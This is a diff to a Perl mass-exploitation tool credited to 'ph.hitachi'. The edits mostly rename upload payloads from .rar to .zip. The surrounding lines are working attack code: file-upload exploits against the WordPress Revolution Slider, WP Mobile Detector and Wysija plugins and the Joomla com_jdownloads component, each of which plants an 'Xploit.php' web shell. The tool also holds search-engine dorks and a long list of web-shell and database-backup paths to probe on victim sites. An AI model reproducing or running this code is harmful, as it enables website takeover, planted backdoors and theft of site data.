@@ -1,3 +1,8 @@
+#Coded by ph.hitachi
+#Don't change my right bitches
+#This code free don't copy my codes and sale it :V
+
+
 use if $^O eq "MSWin32", Win32::Console::ANSI;
 use Getopt::Long;
 use HTTP::Request;
@@ -632,7 +637,7 @@ my $path = "wp-admin/admin-ajax.php";
 my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
 $ua->timeout(10);
 $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
-my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["Xploitrevs.rar"]]);
+my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [action => "revslider_ajax_action", client_action => "update_plugin", update_file => ["Xploitrevs.zip"]]);
 
 if ($exploit->decoded_content =~ /Wrong update extracted folder/) {
     print color('bold green');
@@ -1916,10 +1921,10 @@ print color('bold red'),"NOT VULN\n";
 
 ################################## WP Mobile Detector ########################################
 ##############################################################################################
-# check the link of the shell or you can upload "wpmobiledetectorshell.rar" on you one shell #
+# check the link of the shell or you can upload "wpmobiledetectorshell.zip" on you one shell #
 ##############################################################################################
 sub wpmobiledetector(){ 
-$wpmdshell = "wpmobiledetectorshell.rar";
+$wpmdshell = "wpmobiledetectorshell.zip";
 $url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
 $wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/Xploit.php";
 
@@ -1959,7 +1964,7 @@ $ua->timeout(10);
 $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
 
 
-my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['Xploit.rar', => 'Xploit.rar'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
+my $wysijares = $ua->post("$url", Content_Type => 'form-data', Content => [ $theme => ['Xploit.zip', => 'Xploit.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);
 $wysijaup = "$site/wp-content/uploads/wysija/themes/xploit/Xploit.php";
 my $checkwysija = $ua->get("$wysijaup")->content;
 if($checkwysija =~/X Xploit/) {
@@ -5660,7 +5665,7 @@ close(TEXT);
 
 ################ comjdownloads #####################
 sub comjdownloads(){
-$file="cjd.rar";
+$file="cjd.zip";
 $filez="Xploit.php.php.j";
 $jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
 $shellpath= $site . '/images/jdownloads/screenshots/Xploit.php.j';
@@ -5698,7 +5703,7 @@ print color('bold red'),"NOT VULN\n";
 ################ comjdownloads index #####################
 sub comjdownloadsdef(){
 $def = $site . '/images/jdownloads/screenshots/Xploit.html.j';
-$filee="Xploithtml.rar";
+$filee="Xploithtml.zip";
 $filezz="Xploit.html.j";
 my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Justin lee", mail=>"spinningarrix@gmail.com", filetitle =>"Justin lee", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
 if ($exploitx->content =~ /The file was successfully transferred to the server/) {
@@ -7863,7 +7868,7 @@ intext:Kembali ke Website Utama
 intext:Developed by  inurl:berita- ext:html
 inurl:/statis-1- ext:html site:.
 inurl:/statis-1- ext:html site:.com/net/id/coli :V
-Copyright © 2013 by Polostama. All rights reserved.
+Copyright Â© 2013 by Polostama. All rights reserved.
 inurl:media.php?module=home\n\n";
 
 print color('bold white'), " [";
@@ -7929,28 +7934,28 @@ chomp $site;
 if($site !~ /http:\/\//) { $site = "$site/"; };
  
 print "\n";
-@path = ('WSO.php','1998.php','dz.php','w.php','wp-content/plugins/akismet/akismet.php','images/stories/w.php','w.php','shell.php','cpanel.php','cpn.php','13.php','sql.php','mysql.php','config.php','configuration.php','madspot.php','Cgishell.pl','killer.php','changeall.php','2.php','Sh3ll.php','dz0.php','dam.php','user.php','dom.php','whmcs.php','r00t.php','1.php','a.php','r0k.php','abc.php','egy.php','syrian_shell.php','xxx.php','settings.php','tmp.php','cyber.php','c99.php','r57.php','404.php','gaza.php','1.php','d4rk.php','index1.php','nkr.php','xd.php','M4r0c.php','Dz.php','sniper.php','ksa.php','v4team.php','offline.php','priv8.php','911.php','madspotshell.php','c100.php','sym.php','cp.php','tmp/cpn.php','tmp/w.php','tmp/r57.php','tmp/king.php','tmp/sok.php','tmp/ss.php','tmp/as.php','tmp/dz.php','tmp/r1z.php','tmp/whmcs.php','tmp/root.php','tmp/r00t.php','templates/beez/index.php','templates/beez/beez.php','templates/rhuk_milkyway/index.php','tmp/uploads.php','tmp/upload.php','tmp/sa.php','sa.php','readme.php','tmp/readme.php','wp.rar'.'wp-content/plugins/disqus-comment-system/disqus.php',
+@path = ('WSO.php','1998.php','dz.php','w.php','wp-content/plugins/akismet/akismet.php','images/stories/w.php','w.php','shell.php','cpanel.php','cpn.php','13.php','sql.php','mysql.php','config.php','configuration.php','madspot.php','Cgishell.pl','killer.php','changeall.php','2.php','Sh3ll.php','dz0.php','dam.php','user.php','dom.php','whmcs.php','r00t.php','1.php','a.php','r0k.php','abc.php','egy.php','syrian_shell.php','xxx.php','settings.php','tmp.php','cyber.php','c99.php','r57.php','404.php','gaza.php','1.php','d4rk.php','index1.php','nkr.php','xd.php','M4r0c.php','Dz.php','sniper.php','ksa.php','v4team.php','offline.php','priv8.php','911.php','madspotshell.php','c100.php','sym.php','cp.php','tmp/cpn.php','tmp/w.php','tmp/r57.php','tmp/king.php','tmp/sok.php','tmp/ss.php','tmp/as.php','tmp/dz.php','tmp/r1z.php','tmp/whmcs.php','tmp/root.php','tmp/r00t.php','templates/beez/index.php','templates/beez/beez.php','templates/rhuk_milkyway/index.php','tmp/uploads.php','tmp/upload.php','tmp/sa.php','sa.php','readme.php','tmp/readme.php','wp.zip'.'wp-content/plugins/disqus-comment-system/disqus.php',
 'd0mains.php','wp-content/plugins/akismet/akismet.php','madspotshell.php','indoxploit.php','IndoXploit.php','andela.php','mini.php','info.php','egyshell.php','Sym.php','c22.php','c100.php',
 'wp-content/plugins/akismet/admin.php#','configuration.php','g.php','wp-content/plugins/google-sitemap-generator/sitemap-core.php#',
 'wp-content/plugins/akismet/widget.php#','xx.pl','ls.php','Cpanel.php','k.php','zone-h.php','tmp/user.php','tmp/Sym.php','cp.php',
 'tmp/madspotshell.php','tmp/root.php','tmp/whmcs.php','tmp/index.php','tmp/2.php','tmp/dz.php','tmp/cpn.php',
 'tmp/changeall.php','tmp/Cgishell.pl','tmp/sql.php','0day.php','tmp/admin.php','cliente/downloads/h4xor.php',
 'whmcs/downloads/dz.php','L3b.php','d.php','tmp/d.php','tmp/L3b.php','wp-content/plugins/akismet/admin.php',
-'templates/rhuk_milkyway/index.php','templates/beez/index.php','sado.php','admin1.php','upload.php','up.php','vb.rar','vb.rar',
+'templates/rhuk_milkyway/index.php','templates/beez/index.php','sado.php','admin1.php','upload.php','up.php','vb.zip','vb.zip',
 'admin2.asp','uploads.php','sa.php','sysadmins/','admin1/','sniper.php','administration/Sym.php','images/Sym.php',
 '/r57.php','/wp-content/plugins/disqus-comment-system/disqus.php','gzaa_spysl','sql-new.php','/shell.php','/sa.php','/admin.php',
 '/sa2.php','/2.php','/gaza.php','/up.php','/upload.php','/uploads.php','/templates/beez/index.php','shell.php','/amad.php',
-'/t00.php','/dz.php','/site.rar','/Black.php','/site.tar.gz','/home.rar','/home.rar','/home.tar','/home.tar.gz',
-'/forum.rar','/forum.rar','/forum.tar','/forum.tar.gz','/test.txt','/ftp.txt','/user.txt','/site.txt','/error_log','/error',
-'/cpanel','/awstats','/site.sql','/vb.sql','/forum.sql','r00t-s3c.php','c.php','/backup.sql','/back.sql','/data.sql','wp.rar/',
+'/t00.php','/dz.php','/site.zip','/Black.php','/site.tar.gz','/home.zip','/home.zip','/home.tar','/home.tar.gz',
+'/forum.zip','/forum.zip','/forum.tar','/forum.tar.gz','/test.txt','/ftp.txt','/user.txt','/site.txt','/error_log','/error',
+'/cpanel','/awstats','/site.sql','/vb.sql','/forum.sql','r00t-s3c.php','c.php','/backup.sql','/back.sql','/data.sql','wp.zip/',
 'wp-content/plugins/disqus-comment-system/disqus.php','asp.aspx','/templates/beez/index.php','tmp/vaga.php',
 'tmp/killer.php','whmcs.php','abuhlail.php','tmp/killer.php','tmp/domaine.pl','tmp/domaine.php','useradmin/',
-'tmp/d0maine.php','d0maine.php','tmp/sql.php','X.php','123.php','m.php','b.php','up.php','tmp/dz1.php','dz1.php','forum.rar','Symlink.php','Symlink.pl',
-'forum.rar','joomla.rar','joomla.rar','wp.php','buck.sql','sysadmin.php','images/c99.php', 'xd.php', 'c100.php',
+'tmp/d0maine.php','d0maine.php','tmp/sql.php','X.php','123.php','m.php','b.php','up.php','tmp/dz1.php','dz1.php','forum.zip','Symlink.php','Symlink.pl',
+'forum.zip','joomla.zip','joomla.zip','wp.php','buck.sql','sysadmin.php','images/c99.php', 'xd.php', 'c100.php',
 'spy.aspx','xd.php','tmp/xd.php','sym/root/home/','billing/killer.php','tmp/upload.php','tmp/admin.php',
 'Server.php','tmp/uploads.php','tmp/up.php','Server/','wp-admin/c99.php','tmp/priv8.php','priv8.php','cgi.pl/',
 'tmp/cgi.pl','downloads/dom.php','templates/ja-helio-farsi/index.php','webadmin.html','admins.php',
-'/wp-content/plugins/count-per-day/js/yc/d00.php','bluff.php','king.jeen','admins/','admins.asp','admins.php','wp.rar','/wp-content/plugins/disqus-comment-system/WSO.php',
+'/wp-content/plugins/count-per-day/js/yc/d00.php','bluff.php','king.jeen','admins/','admins.asp','admins.php','wp.zip','/wp-content/plugins/disqus-comment-system/WSO.php',
 '/images/root.php',
 '/COPYRIGHT.php',
 '/images/root.php',
@@ -8031,8 +8036,8 @@ print "\n";
 'wp-content/plugins/akismet/admin1.php',
 'wp-content/plugins/akismet/upload.php',
 'wp-content/plugins/akismet/up.php',
-'wp-content/plugins/akismet/vb.rar',
-'wp-content/plugins/akismet/vb.rar',
+'wp-content/plugins/akismet/vb.zip',
+'wp-content/plugins/akismet/vb.zip',
 'wp-content/plugins/akismet/admin2.asp',
 'wp-content/plugins/akismet/uploads.php',
 'wp-content/plugins/akismet/sa.php',
@@ -8054,7 +8059,7 @@ print "\n";
 'wp-content/plugins/akismet//backup.sql',
 'wp-content/plugins/akismet//back.sql',
 'wp-content/plugins/akismet//data.sql',
-'wp-content/plugins/akismet/wp.rar/',
+'wp-content/plugins/akismet/wp.zip/',
 'wp-content/plugins/akismet/asp.aspx',
 'wp-content/plugins/akismet/tmp/vaga.php',
 'wp-content/plugins/akismet/tmp/killer.php',
@@ -8074,12 +8079,12 @@ print "\n";
 'wp-content/plugins/akismet/up.php',
 'wp-content/plugins/akismet/tmp/dz1.php',
 'wp-content/plugins/akismet/dz1.php',
-'wp-content/plugins/akismet/forum.rar',
+'wp-content/plugins/akismet/forum.zip',
 'wp-content/plugins/akismet/Symlink.php',
 'wp-content/plugins/akismet/Symlink.pl',
-'wp-content/plugins/akismet/forum.rar',
-'wp-content/plugins/akismet/joomla.rar',
-'wp-content/plugins/akismet/joomla.rar',
+'wp-content/plugins/akismet/forum.zip',
+'wp-content/plugins/akismet/joomla.zip',
+'wp-content/plugins/akismet/joomla.zip',
 'wp-content/plugins/akismet/wp.php',
 'wp-content/plugins/akismet/buck.sql',
 'wp-content/plugins/akismet/sysadmin.php',
@@ -8110,7 +8115,7 @@ print "\n";
 'wp-content/plugins/akismet/admins/',
 'wp-content/plugins/akismet/admins.asp',
 'wp-content/plugins/akismet/admins.php',
-'wp-content/plugins/akismet/wp.rar',
+'wp-content/plugins/akismet/wp.zip',
 'wp-content/plugins/akismet/disqus.php',
 'wp-content/plugins/google-sitemap-generator//cpanel',
 'wp-content/plugins/google-sitemap-generator//awstats',
@@ -8122,7 +8127,7 @@ print "\n";
 'wp-content/plugins/google-sitemap-generator//backup.sql',
 'wp-content/plugins/google-sitemap-generator//back.sql',
 'wp-content/plugins/google-sitemap-generator//data.sql',
-'wp-content/plugins/google-sitemap-generator/wp.rar/',
+'wp-content/plugins/google-sitemap-generator/wp.zip/',
 'wp-content/plugins/google-sitemap-generator/asp.aspx',
 'wp-content/plugins/google-sitemap-generator/tmp/xd.php',
 'wp-content/plugins/google-sitemap-generator/sym/root/home/',
@@ -8146,7 +8151,7 @@ print "\n";
 'wp-content/plugins/google-sitemap-generator/admins/',
 'wp-content/plugins/google-sitemap-generator/admins.asp',
 'wp-content/plugins/google-sitemap-generator/admins.php',
-'wp-content/plugins/google-sitemap-generator/wp.rar',
+'wp-content/plugins/google-sitemap-generator/wp.zip',
 'wp-content/plugins/google-sitemap-generator/sitemap-core.php',
 '/templates/beez/WSO.php',
 '/templates/beez/dz.php',
@@ -8189,8 +8194,8 @@ print "\n";
 '/templates/beez/admin1.php',
 '/templates/beez/upload.php',
 '/templates/beez/up.php',
-'/templates/beez/vb.rar',
-'/templates/beez/vb.rar',
+'/templates/beez/vb.zip',
+'/templates/beez/vb.zip',
 '/templates/beez/admin2.asp',
 '/templates/beez/uploads.php',
 '/templates/beez/sa.php',
@@ -8214,15 +8219,15 @@ print "\n";
 '/templates/beez//amad.php',
 '/templates/beez//t00.php',
 '/templates/beez//dz.php',
-'/templates/beez//site.rar',
+'/templates/beez//site.zip',
 '/templates/beez//Black.php',
 '/templates/beez//site.tar.gz',
-'/templates/beez//home.rar',
-'/templates/beez//home.rar',
+'/templates/beez//home.zip',
+'/templates/beez//home.zip',
 '/templates/beez//home.tar',
 '/templates/beez//home.tar.gz',
-'/templates/beez//forum.rar',
-'/templates/beez//forum.rar',
+'/templates/beez//forum.zip',
+'/templates/beez//forum.zip',
 '/templates/beez//forum.tar',
 '/templates/beez//forum.tar.gz',
 '/templates/beez//test.txt',
@@ -8241,7 +8246,7 @@ print "\n";
 '/templates/beez//backup.sql',
 '/templates/beez//back.sql',
 '/templates/beez//data.sql',
-'/templates/beez/wp.rar/',
+'/templates/beez/wp.zip/',
 '/templates/beez/asp.aspx',
 '/templates/beez/tmp/vaga.php',
 '/templates/beez/tmp/killer.php',
@@ -8261,12 +8266,12 @@ print "\n";
 '/templates/beez/up.php',
 '/templates/beez/tmp/dz1.php',
 '/templates/beez/dz1.php',
-'/templates/beez/forum.rar',
+'/templates/beez/forum.zip',
 '/templates/beez/Symlink.php',
 '/templates/beez/Symlink.pl',
-'/templates/beez/forum.rar',
-'/templates/beez/joomla.rar',
-'/templates/beez/joomla.rar',
+'/templates/beez/forum.zip',
+'/templates/beez/joomla.zip',
+'/templates/beez/joomla.zip',
 '/templates/beez/wp.php',
 '/templates/beez/buck.sql',
 '/templates/beez/sysadmin.php',
@@ -8297,7 +8302,7 @@ print "\n";
 '/templates/beez/admins/',
 '/templates/beez/admins.asp',
 '/templates/beez/admins.php',
-'/templates/beez/wp.rar',
+'/templates/beez/wp.zip',
 '/templates/beez/index.php','/images/WSO.php',
 '/images/dz.php',
 '/images/DZ.php',
@@ -8321,7 +8326,7 @@ print "\n";
 '/images/user.php',
 '/images/dom.php',
 '/images/whmcs.php',
-'/images/vb.rar',
+'/images/vb.zip',
 '/images/sa.php',
 '/images/sysadmins/',
 '/images/admin1/',
@@ -8349,7 +8354,7 @@ print "\n";
 '/images//backup.sql',
 '/images//back.sql',
 '/images//data.sql',
-'/images/wp.rar/',
+'/images/wp.zip/',
 '/images/asp.aspx',
 '/images/tmp/vaga.php',
 '/images/tmp/killer.php',
@@ -8369,12 +8374,12 @@ print "\n";
 '/images/up.php',
 '/images/tmp/dz1.php',
 '/images/dz1.php',
-'/images/forum.rar',
+'/images/forum.zip',
 '/images/Symlink.php',
 '/images/Symlink.pl',
-'/images/forum.rar',
-'/images/joomla.rar',
-'/images/joomla.rar',
+'/images/forum.zip',
+'/images/joomla.zip',
+'/images/joomla.zip',
 '/images/wp.php',
 '/images/buck.sql',
 '/includes/WSO.php',
@@ -8400,7 +8405,7 @@ print "\n";
 '/includes/user.php',
 '/includes/dom.php',
 '/includes/whmcs.php',
-'/includes/vb.rar',
+'/includes/vb.zip',
 '/includes/r00t.php',
 '/includes/c99.php',
 '/includes/gaza.php',
@@ -8442,8 +8447,8 @@ print "\n";
 '/includes/admin1.php',
 '/includes/upload.php',
 '/includes/up.php',
-'/includes/vb.rar',
-'/includes/vb.rar',
+'/includes/vb.zip',
+'/includes/vb.zip',
 '/includes/admin2.asp',
 '/includes/uploads.php',
 '/includes/sa.php',
@@ -8467,15 +8472,15 @@ print "\n";
 '/includes//amad.php',
 '/includes//t00.php',
 '/includes//dz.php',
-'/includes//site.rar',
+'/includes//site.zip',
 '/includes//Black.php',
 '/includes//site.tar.gz',
-'/includes//home.rar',
-'/includes//home.rar',
+'/includes//home.zip',
+'/includes//home.zip',
 '/includes//home.tar',
 '/includes//home.tar.gz',
-'/includes//forum.rar',
-'/includes//forum.rar',
+'/includes//forum.zip',
+'/includes//forum.zip',
 '/includes//forum.tar',
 '/includes//forum.tar.gz',
 '/includes//test.txt',
@@ -8494,7 +8499,7 @@ print "\n";
 '/includes//backup.sql',
 '/includes//back.sql',
 '/includes//data.sql',
-'/includes/wp.rar/',
+'/includes/wp.zip/',
 '/includes/asp.aspx',
 '/includes/tmp/vaga.php',
 '/includes/tmp/killer.php',
@@ -8514,12 +8519,12 @@ print "\n";
 '/includes/up.php',
 '/includes/tmp/dz1.php',
 '/includes/dz1.php',
-'/includes/forum.rar',
+'/includes/forum.zip',
 '/includes/Symlink.php',
 '/includes/Symlink.pl',
-'/includes/forum.rar',
-'/includes/joomla.rar',
-'/includes/joomla.rar',
+'/includes/forum.zip',
+'/includes/joomla.zip',
+'/includes/joomla.zip',
 '/includes/wp.php',
 '/includes/buck.sql',
 '/includes/sysadmin.php',
@@ -8551,7 +8556,7 @@ print "\n";
 '/includes/admins/',
 '/includes/admins.asp',
 '/includes/admins.php',
-'/includes/wp.rar',
+'/includes/wp.zip',
 '/includes/',
 '/templates/rhuk_milkyway/WSO.php',
 '/templates/rhuk_milkyway/dz.php',
@@ -8576,7 +8581,7 @@ print "\n";
 '/templates/rhuk_milkyway/user.php',
 '/templates/rhuk_milkyway/dom.php',
 '/templates/rhuk_milkyway/whmcs.php',
-'/templates/rhuk_milkyway/vb.rar',
+'/templates/rhuk_milkyway/vb.zip',
 '/templates/rhuk_milkyway/r00t.php',
 '/templates/rhuk_milkyway/c99.php',
 '/templates/rhuk_milkyway/gaza.php',
@@ -8618,8 +8623,8 @@ print "\n";
 '/templates/rhuk_milkyway/admin1.php',
 '/templates/rhuk_milkyway/upload.php',
 '/templates/rhuk_milkyway/up.php',
-'/templates/rhuk_milkyway/vb.rar',
-'/templates/rhuk_milkyway/vb.rar',
+'/templates/rhuk_milkyway/vb.zip',
+'/templates/rhuk_milkyway/vb.zip',
 '/templates/rhuk_milkyway/admin2.asp',
 '/templates/rhuk_milkyway/uploads.php',
 '/templates/rhuk_milkyway/sa.php',
@@ -8643,15 +8648,15 @@ print "\n";
 '/templates/rhuk_milkyway//amad.php',
 '/templates/rhuk_milkyway//t00.php',
 '/templates/rhuk_milkyway//dz.php',
-'/templates/rhuk_milkyway//site.rar',
+'/templates/rhuk_milkyway//site.zip',
 '/templates/rhuk_milkyway//Black.php',
 '/templates/rhuk_milkyway//site.tar.gz',
-'/templates/rhuk_milkyway//home.rar',
-'/templates/rhuk_milkyway//home.rar',
+'/templates/rhuk_milkyway//home.zip',
+'/templates/rhuk_milkyway//home.zip',
 '/templates/rhuk_milkyway//home.tar',
 '/templates/rhuk_milkyway//home.tar.gz',
-'/templates/rhuk_milkyway//forum.rar',
-'/templates/rhuk_milkyway//forum.rar',
+'/templates/rhuk_milkyway//forum.zip',
+'/templates/rhuk_milkyway//forum.zip',
 '/templates/rhuk_milkyway//forum.tar',
 '/templates/rhuk_milkyway//forum.tar.gz',
 '/templates/rhuk_milkyway//test.txt',
@@ -8670,7 +8675,7 @@ print "\n";
 '/templates/rhuk_milkyway//backup.sql',
 '/templates/rhuk_milkyway//back.sql',
 '/templates/rhuk_milkyway//data.sql',
-'/templates/rhuk_milkyway/wp.rar/',
+'/templates/rhuk_milkyway/wp.zip/',
 '/templates/rhuk_milkyway/asp.aspx',
 '/templates/rhuk_milkyway/tmp/vaga.php',
 '/templates/rhuk_milkyway/tmp/killer.php',
@@ -8690,12 +8695,12 @@ print "\n";
 '/templates/rhuk_milkyway/up.php',
 '/templates/rhuk_milkyway/tmp/dz1.php',
 '/templates/rhuk_milkyway/dz1.php',
-'/templates/rhuk_milkyway/forum.rar',
+'/templates/rhuk_milkyway/forum.zip',
 '/templates/rhuk_milkyway/Symlink.php',
 '/templates/rhuk_milkyway/Symlink.pl',
-'/templates/rhuk_milkyway/forum.rar',
-'/templates/rhuk_milkyway/joomla.rar',
-'/templates/rhuk_milkyway/joomla.rar',
+'/templates/rhuk_milkyway/forum.zip',
+'/templates/rhuk_milkyway/joomla.zip',
+'/templates/rhuk_milkyway/joomla.zip',
 '/templates/rhuk_milkyway/wp.php',
 '/templates/rhuk_milkyway/buck.sql',
 '/templates/rhuk_milkyway/sysadmin.php',
@@ -8726,7 +8731,7 @@ print "\n";
 '/templates/rhuk_milkyway/admins/',
 '/templates/rhuk_milkyway/admins.asp',
 '/templates/rhuk_milkyway/admins.php',
-'/templates/rhuk_milkyway/wp.rar',
+'/templates/rhuk_milkyway/wp.zip',
 '/templates/rhuk_milkyway/','WSO.php',
 'a.php',
 'z.php',
